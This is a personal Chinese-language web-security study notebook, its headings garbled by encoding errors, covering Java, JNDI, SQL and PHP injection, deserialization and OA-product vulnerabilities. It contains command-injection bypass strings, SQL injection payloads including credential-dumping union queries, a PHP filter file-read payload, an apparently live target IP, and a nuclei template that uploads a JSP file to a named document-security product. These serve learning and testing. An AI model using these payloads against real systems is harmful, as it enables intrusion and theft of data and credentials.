---
title: webå®‰å…¨
date: 2023-01-25 15:11:40 +0800
categories: 
tags: 
permalink: /posts/id=82/
pin: false
published:
---



## JAVA 
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240125144545.png)

synchronized å…³é”®å­—å£°æ˜çš„æ–¹æ³•åŒä¸€æ—¶é—´åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹è®¿é—®

### javaååºåˆ—åŒ–

####








### æ‹“å±•é˜…è¯»

[åŸºç¡€æ–‡æ¡£](https://www.runoob.com/java/java-modifier-types.html)
[æ”»å‡»Java Webåº”ç”¨-[Java Webå®‰å…¨]](https://javasec.org/)
[Javaç³»åˆ—è¯¾ç¨‹ä¹‹Springbootç³»åˆ—](https://www.bilibili.com/video/BV1PE411i7CV/?vd_source=d4a3bdd27772e6a63512c0f92e6b4ca6)




## struct2

### æ‹“å±•é˜…è¯»
[åˆæ¢ Struts2 æ¡†æ¶å®‰å…¨](https://paper.seebug.org/3067/)

## Maven


ç¯å¢ƒé…ç½®ï¼šhttps://www.runoob.com/maven/maven-setup.html

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240126113323.png)

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240126113536.png)



## http

X-Forwarded-For


## å‘½ä»¤æ³¨å…¥
å­—ç¬¦ä¸²ç»•è¿‡
ç©ºæ ¼
```bash
ls$IFS$9-lha
ls -lha


cat$IFS$9`ls`  # ç»•è¿‡flag '' ""



```



## jndi æ³¨å…¥

APIç»™ç”¨æˆ·ä½¿ç”¨ï¼Œè°ƒç”¨Naming Managerè¿›è¡ŒæŸ¥è¯¢æ“ä½œï¼Œå†è°ƒç”¨èƒŒåçš„SPIå»å®ç°å¯¹åº”çš„æŸ¥è¯¢

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240125203608.png)



```java
//Calculator.java
public class Calculator {
    public Calculator() throws Exception {
        Runtime.getRuntime().exec("gnome-calculator");
    }
}
```

[JNDIæ³¨å…¥åŸç†åŠåˆ©ç”¨è€ƒç©¶](https://xz.aliyun.com/t/12277?time__1311=mqmhD5YIOhOD%2FD0lbGk%2BDkb5i%3DlFpFmD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-0)
[æµ…æJNDIæ³¨å…¥](https://xz.aliyun.com/t/13017?time__1311=mqmxnDBDu7i%3D%3D0KDsD7mG7DyihHeQrg%2BDbD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-3)

## sqlæ³¨å…¥

ä¿®æ”¹||çš„ä½œç”¨ä¸ºå­—ç¬¦ä¸²æ‹¼æ¥
```
select $post['query']||flag from Flag


1;set sql_mode=PIPES_AS_CONCAT;select 1
```


showçˆ†å­—æ®µ
```
show datebases; //æ•°æ®åº“ã€‚
show tables; //è¡¨åã€‚
show columns from table; //å­—æ®µã€‚
desc `Flag`;// æŸ¥çœ‹flagè¡¨çš„å­—æ®µ
```

alteræ”¹è¡¨åç»•è¿‡

```
alter table " table_name" add " column_name"  type; //æ·»åŠ ä¸€ä¸ªåˆ—
alter table " table_name" drop " column_name"  type; // åˆ é™¤ä¸€ä¸ªåˆ—
alter table " table_name" alter column " column_name" type;
alter table " table_name" change " column1" " column2" type;//æ”¹åˆ—å
alter table "table_name" rename "column1" to "column2";

```


handler
```
1'; handler `1919810931114514` open as `a`; handler `a` read next;#
```

è¡¨åä¸ºæ•°å­—ç”¨åå¼•å·
```
0'; show columns from `1919810931114514 `; #
```

ç™»å½•ç»•è¿‡
```
' or 1=1 #
```




unionæŸ¥è¯¢æ³¨å…¥ï¼ˆæŸ¥è¯¢åŸå§‹æŸ¥è¯¢çš„æŸ¥è¯¢æ•°ï¼‰

```
-1' union select 1,2
æŸ¥è¯¢åˆ—æ•°ä¸º3æ—¶
'union select 1,2,group_concat(schema_name) from information_schema.schemata;#  //ç¡®å®šæ•°æ®åº“å
' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek';#  //ç¡®å®šæ•°æ®è¡¨å
' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' and table_name='l0ve1ysq1';# //ç¡®å®šè¡¨å­—æ®µå
' union select 1,2,group_concat(username,password) from geek.l0ve1ysq1;# //æŸ¥çœ‹å­—æ®µå†…å®¹

```

å¸ƒå°”ç›²æ³¨



å †å æ³¨å…¥
```
0'; show databases; #
```



## php


```php
$_page = mb_substr( //å®ƒç”¨äºä»å­—ç¬¦ä¸²ä¸­æå–å­å­—ç¬¦ä¸²
	$page,//ç›®æ ‡
	0,//å¼€å§‹çš„ä½ç½®
	mb_strpos($page . '?',  '?') //é•¿åº¦  //æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®
	//ç›®æ ‡/æŸ¥æ‰¾çš„å­—ç¬¦ä¸²/æœç´¢å¼€å§‹çš„åœ°æ–¹
);
```

æ–‡ä»¶åŒ…å«
include "source.php"
include "source.php?../../../flag"

è¿‡æ»¤å™¨
?file=php://filter/read=convert.base64-encode/resource=flag.php

å¯¹flag.phpæ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œbase64åŠ å¯†ï¼Œå†è®¿é—®(æ­£å¸¸phpæ‰§è¡Œä¼šä¸¢å¼ƒæ‰ä¸€äº›ä»£ç )

ç•¸å½¢åç¼€
phtmlã€phtã€phpã€php3ã€php4ã€php5




\*in_array(search,array,type) å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ å¾ˆå®¹æ˜“å‡ºç°ç›®å½•ç©¿è¶Š

urldecode($page)å‡½æ•°åœ¨PHPä¸­ç”¨äºè§£ç å·²ç»ç»è¿‡URLç¼–ç çš„å­—ç¬¦ä¸²

```php
array();

```

phpæ•™ç¨‹ï¼šhttps://www.runoob.com/php/php-arrays-sort.html

### phpååºåˆ—åŒ–

[phpååºåˆ—åŒ–å®Œæ•´æ€»ç»“](https://xz.aliyun.com/t/12507?time__1311=mqmhD50I1G7D%2FD0l8Gk%2BHRDiuUFyteD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-5)

phpåºåˆ—åŒ–
```php
<?php
    class CTF{
        public $flag="flag{xxx}";
        public $name="cxk";
        public $age= "10";
        public function __sleep(){
            return array("flag","age") ;
        }
    }
    $ctf =new CTF();
    $ctf->flag= "flag{e4l4}";
    $ctf->name= "e4l4";
    $ctf->age= "20";

    echo serialize($ctf);
	//$e4l4 = serialize($ctf); ååºåˆ—åŒ–

    //var_dump(unserialize($e4l4));

?>

PS C:\Users\E4L4\Desktop> php .\exp.php
O:3:"CTF":3:{s:4:"flag";s:10:"flag{e4l4}";s:4:"name";s:4:"e4l4";s:3:"age";s:2:"20";}
PS C:\Users\E4L4\Desktop> php .\exp.php
O:3:"CTF":2:{s:4:"flag";s:10:"flag{e4l4}";s:3:"age";s:2:"20";}
```

ä¸åŒçš„è®¿é—®æ§åˆ¶ä¿®é¥°åºåˆ—åŒ–åçš„é•¿åº¦ä¹Ÿä¸ä¸€æ ·
å…ˆåˆ†æä¸€ä¸‹ç»“æœ
```
O:3:"CTF":2:{s:4:"flag";s:10:"flag{e4l4}";s:3:"age";s:2:"20";}

O:å¯¹è±¡åçš„é•¿åº¦:å¯¹è±¡å:å¯¹è±¡åºåˆ—åŒ–çš„å±æ€§ä¸ªæ•°:{s:å±æ€§åçš„é•¿åº¦:å±æ€§å;s:å±æ€§å€¼çš„é•¿åº¦:å±æ€§å€¼;å±æ€§åçš„é•¿åº¦:å±æ€§å;s:å±æ€§å€¼çš„é•¿åº¦:å±æ€§å€¼;}
```

protectedæƒé™çš„å˜é‡åœ¨åºåˆ—åŒ–çš„æ—¶ä¼šæœ‰%00*%00å­—ç¬¦ï¼Œè¿™æ ·çš„å­—ç¬¦æ˜¯ä¸å¯è§å­—ç¬¦




é­”æ³•æ–¹æ³•

```
__sleep  åœ¨ç±»è¢«åºåˆ—åŒ–ä¹‹å‰ï¼Œç¡®å®šè¯¥ç±»ä¸­å“ªäº›æ˜¯è¢«åºåˆ—åŒ–çš„ç›®æ ‡

__wakeup åœ¨è¢«ååºåˆ—åŒ–ä¸ºä¸€ä¸ªç±»ä¹‹å‰ï¼Œå…ˆé¢„å®šä¹‰ä¸€äº›å€¼

__construct():å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ã€‚

__destruct():ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚
```

```php
<?php
    class CTF{
        public $flag="flag{xxx}";
        public $name="cxk";
        public $age= "10";
        public function __sleep(){
            return array("flag","age") ;
        }
        public function __wakeup(){
            $this->flag= "flag{fake}";
        }
    }
    $ctf =new CTF();
    $ctf->flag= "flag{e4l4}";
    $ctf->name= "e4l4";
    $ctf->age= "20";

    $e4l4 = 'O:3:"CTF":2:{s:4:"flag";s:15:"flag{pwnbye4l4}";s:3:"age";s:2:"20";}';

    var_dump(unserialize($e4l4));
?>
```


## ä»£ç å®¡è®¡å®æˆ˜ğŸ¤”

1ã€PHPä»£ç å®¡è®¡ç”¨ RIPS   https://sourceforge.net/projects/rips-scanner/
2ã€JAVAä»£ç å®¡è®¡ç”¨ findbugs  http://findbugs.sourceforge.net/downloads.html https://www.jianshu.com/p/c43940c4e025
3ã€ .net https://security-code-scan.github.io/
4ã€å¤šç§è¯­è¨€ä»£ç æ£€æŸ¥å·¥å…·   sonarï¼š  https://docs.sonarqube.org/display/SONAR
https://www.sonarsource.com/products/codeanalyzers/sonarjava/rules.html#Vulnerability_Detection
https://github.com/SonarSource/sonarqub  
5ã€fortify è¿™ä¸ªä¹Ÿæ˜¯å¾ˆå¥½ç”¨çš„

é»‘ç›’æµ‹è¯•ï¼š

é¦–å…ˆæ€»è§ˆæ‰€æœ‰ç”¨æˆ·åŠŸèƒ½ï¼Œå¯¹å¯èƒ½çš„è„†å¼±æ€§è¿›è¡Œç®€å•æµ‹è¯•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç½‘ç«™é‡è¦åŠŸèƒ½æœ‰æ²¡æœ‰CSRFé˜²å¾¡æ¥åˆ¤æ–­ç½‘é¡µçš„å®‰å…¨æ€§

ç™½ç›’æµ‹è¯•ï¼š

1.æ•°æ®åº“æœºåˆ¶
2.è·¯ç”±æœºåˆ¶
å…¶æ¬¡ï¼Œå¯¹äºä¸€ä¸ªwebæ¡†æ¶ï¼Œé¦–è¦åŠŸèƒ½å°±æ˜¯è·¯ç”±æœºåˆ¶ã€‚è·¯ç”±æœºåˆ¶å°†URLå’Œæ–‡ä»¶å¯¹åº”èµ·æ¥ï¼Œå½¢æˆä¸€ç§æ˜ å°„ã€‚äº†è§£è·¯ç”±æœºåˆ¶æ˜¯ä¸ºäº†è§¦å‘ä¸€äº›ç”¨æˆ·é¡µé¢æ— æ³•å‘ç°çš„éšè—åŠŸèƒ½ã€‚
æˆ‘ä»¬ä»ç½‘é¡µå…¥å£å±‚å±‚è·Ÿè¿›ã€‚

å…ˆåŠ è½½æ¨¡å—å†åŠ è½½æ§åˆ¶å™¨

3.è§†å›¾æœºåˆ¶
ç½‘é¡µæœ‰æ²¡æœ‰xssç±»ä¼¼çš„æ¼æ´ï¼Œå°±éœ€è¦ç ”ç©¶è¯¥æ¡†æ¶çš„è§†å›¾æœºåˆ¶ã€‚
åœ¨ç›®å½•ä¸­æ‰¾åˆ°htmlæ–‡ä»¶ã€‚



## æ¼æ´åˆ†æ

é•¿äº­æ¼æ´å¹³å°ï¼šhttps://stack.chaitin.com/vuldb/index


### äº¿èµ›é€šå‰å°RCE
https://222.183.234.130:8443/CDGServer3/index.jsp












### CVE-2021-44228


[ä»é›¶åˆ°ä¸€å¸¦ä½ æ·±å…¥ log4j2 Jndi RCE CVE-2021-44228 æ¼æ´](https://paper.seebug.org/1789/)
Shell ç¼–ç  (Java):https://www.lintstar.top/shell-java/

### é€šè¾¾OA


æ—§ç‰ˆæœ¬ä¸‹è½½ï¼Œ17ï¼ŒV11ç­‰ï¼š
https://www.tongda2000.com/news/p673.php
https://www.tongda2000.com/download/sp2019.php
é€šè¾¾OAæ–°é—»ï¼šhttps://www.tongda2000.com/company/news.php


æœåŠ¡ç«¯ä¸‹è½½ï¼šhttps://www.tongda2000.com/download/p2022.php?F=&K=

åœ¨çº¿è§£å¯†ï¼šhttp://dezend.qiling.org/free.html

[ä»é€šè¾¾OAæ¼æ´å­¦ä¹ 1dayæŒ–æ˜æ€è·¯](https://www.anquanke.com/post/id/210395#h2-3)


### çº¢å¸†OA

[æ¼æ´å¤ç° çº¢å¸†OA udfmr.asmx SQLæ³¨å…¥æ¼æ´](https://mp.weixin.qq.com/s?__biz=MzIxNTIzNTExMQ==&mid=2247489212&idx=1&sn=7aa09faa907c547aefb1361e337c4cd8&chksm=979a39f4a0edb0e234f192ea6858545268b981a844ae292263484f15a096aa5e32755817fee7&scene=126&sessionid=1681181455&key=6e69962d98dc7c63e140064699f3ba1c1a61009765fcfd5fcc5a200ffca6101abfd9475a79b02e3c53f9bfdb0a712f1c7ac1478da5974550717cf60b5067f9ef4d6b59e1e06071dbd3ace195b1495b3aa6b246f1d22eebc421ac1c68e7afdb0541d74f2c68291dfa92e8ad2f19bae78b462272e9606cb63c8fce236b6a553669&ascene=15&uin=MzgxODQ4MjMz&devicetype=Windows+10+x64&version=6309001c&lang=zh_CN&session_us=gh_cdf3717dded0&countrycode=GY&exportkey=n_ChQIAhIQsFw4JubM1NaBzNcm5i42EhLvAQIE97dBBAEAAAAAAIxFOekCHHMAAAAOpnltbLcz9gKNyK89dVj0negl6McqVz1h1%2B5S2vh5i4AQgw5vFNabDUPJYbzgzf753ZL5MBHgANsqsosxNUHIl%2Bx4Xu8xehAzAB4CNP7dtDIed9f9VElWSSWsqYgd5F0Q09ShZJrD8M3EuVShOOU3DPnAsRKN3ZYAwq6YhW06HjhVCMuXHw6%2BTlpRBh2VHbOG9%2B0rWsOJu4zj3ZDblUvJv%2FHcM7w3eG4qKVBitSwyA%2BLPVY7JGt5hrXzxxEORDSMdPvcdLyJk4MUBS0pJNf%2BCBNMawTPjggTd&acctmode=0&pass_)

```
nuclei

id: yisaitong-hiddenWatermark-uploadFile

info:
  name: äº¿èµ›é€šç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ hiddenWatermark/uploadFileæ¥å£å¤„å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´åœ¨æœåŠ¡å™¨ç«¯ä»»æ„æ‰§è¡Œä»£ç  å†™å…¥åé—¨ è·å–æœåŠ¡å™¨æƒé™ è¿›è€Œæ§åˆ¶æ•´ä¸ª web æœåŠ¡å™¨
  author: ts
  severity: high
  metadata: 
    fofa-query: app="äº¿èµ›é€š-ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ"
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        POST /CDGServer3/hiddenWatermark/uploadFile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3lm0J8uEuFHxy191
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 0

        ------WebKitFormBoundary3lm0J8uEuFHxy191
        Content-Disposition: form-data; name="doc"; filename="{{filename}}.zip"
        Content-Type: application/zip
        
        {{base64_decode("UEsDBBQAAAAIAAAAIQD5T26PZgAAAHAAAAAPAAAALi4vLi4vLi4vaGkuanNwHcgxDsIwDAXQnVOESpXixRcoYkSMCAZmq/0CIysOqVuuD2V879Dvki/BtWkJK7k7w8zT3ZtN+46Ggk96ySqszic1ZKnVdJRQL/xAXCF2kXjmhveCOba7oa2G+DcR8YSfkGlI/fELUEsDBBQAAAAIAAAAIQDGTjiHSQAAAGcAAAAWAAAAdGhlbWUvdGhlbWUvdGhlbWUxLnhtbLNR1NWtVnLLzEn1S8xNVbJSSkxMVNIBCwRnVoEEjIyMgAKhxalFcBVAvktqQWJRSW5qXglMBKTC0wXGK8kEqzU0Mlaq1dW1AwBQSwECFAAUAAAACAAAACEA+U9uj2YAAABwAAAADwAAAAAAAAAAAAAAgAEAAAAALi4vLi4vLi4vaGkuanNwUEsBAhQAFAAAAAgAAAAhAMZOOIdJAAAAZwAAABYAAAAAAAAAAAAAAIABkwAAAHRoZW1lL3RoZW1lL3RoZW1lMS54bWxQSwUGAAAAAAIAAgCBAAAAEAEAAAAA")}}
        ------WebKitFormBoundary3lm0J8uEuFHxy191--
        

      - |
        GET /CDGServer3/hi.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0

    matchers:
      - type: dsl # å“åº”ç åŒ¹é…
        dsl:
          - status_code==200 && contains_all(body,"Hello World!")
```
## å‚è€ƒæ–‡ç« /æ‹“å±•é˜…è¯»

[Javaä»£ç å®¡è®¡å…¥é—¨](https://forum.butian.net/share/942)

[X1r0z Blog](https://exp10it.io/)

[å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº](https://forum.butian.net/community)

[äº‘ç½‘OAæœ€æ–°ç‰ˆ FastJson RCE](https://mp.weixin.qq.com/s?__biz=Mzg5MDg3OTc0OA==&mid=2247485418&idx=1&sn=a5047237aedcd852fd8e62f84ae57674&chksm=cedf3d390706480672e7b4be256c7840417263aa3041f37a6015fbe786e9b5538c9e8603ed1a&scene=126&sessionid=1705420783&key=978d8ac09b04f416004f49e48e162552aecfbebf37632119760ec1e98ad30359f36e0e536beecb6a2ec728e9747d04347b286cc6ea88fb81e0653a58eac7e1643cdbba273002138c2cc869de73d5d7f3bdb944b7dd3ca71de5c852d780bc8eff4868f0f5405aded6d5e635533a3f21edcd029017800acc0803edf1c457315f34&ascene=15&uin=NTY2NTA4NjQ%3D&devicetype=Windows+10+x64&version=63060012&lang=zh_CN&session_us=gh_8d57319ec39c&countrycode=AL&exportkey=n_ChQIAhIQFP9JUDTPkdUthKNyb832KBLuAQIE97dBBAEAAAAAAGKGK%2F1O%2BfAAAAAOpnltbLcz9gKNyK89dVj0dyXMJrrMojWHv8cMr5c4Jz17APGIaX93IyVTnEU2Xv9hmZhnGn6dedo8VTFQHVC%2B7jIiCNMnx%2FijzKlgtuVcQlqGTnQ5w92MR4u3Q50tIfCoXGID9jEEUGcrW2H1t9urI0AGbaLahQIXkdKatpGHRMLEUaJM8i1Nda4I7e%2Bs%2BvvRVHRpd41ZEGMEl9AMMAjmuTq7lqLUlGGirNSLIyjko%2Bs9aD0xOUnX%2B1YuaWuoAKOPZxz8OTKzdnrHzEQ48DYtKQjG804Kp1Q%3D&acctmode=0&pass_ticket=iZb%2Bo%2B8VVs2J2uDlzDU8yKpcg6W8W23NyO9IrBs4SHpEgIjXsUZlsTI5JEGWiXc4gFbRB2NWyIGfkMGb%2FDXJrQ%3D%3D&wx_header=0&fontgear=2)



